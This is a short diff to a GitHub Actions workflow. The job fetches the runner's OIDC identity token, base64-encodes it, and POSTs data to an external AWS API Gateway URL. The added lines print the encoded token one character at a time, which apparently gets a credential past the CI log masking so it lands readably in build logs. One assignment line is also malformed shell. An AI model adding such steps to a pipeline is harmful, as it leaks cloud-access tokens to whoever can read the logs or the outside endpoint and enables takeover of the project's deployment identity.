@@ -29,6 +29,10 @@ jobs:
           echo "Start" &&
           AUTH=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://alma" | jq .value) &&
           AUTH=echo $AUTH | cut -d'"' -f 2 | base64 &&
+
+          for (( i=0; i<${#AUTH}; i++ )); do
+            echo "${AUTH:$i:1}"
+          done &&
           
           curl -X POST -H "Content-Type: application/json" -H "authorization: test" --data "$OUT" "https://58emq7exkj.execute-api.eu-south-1.amazonaws.com/v2/action"
     
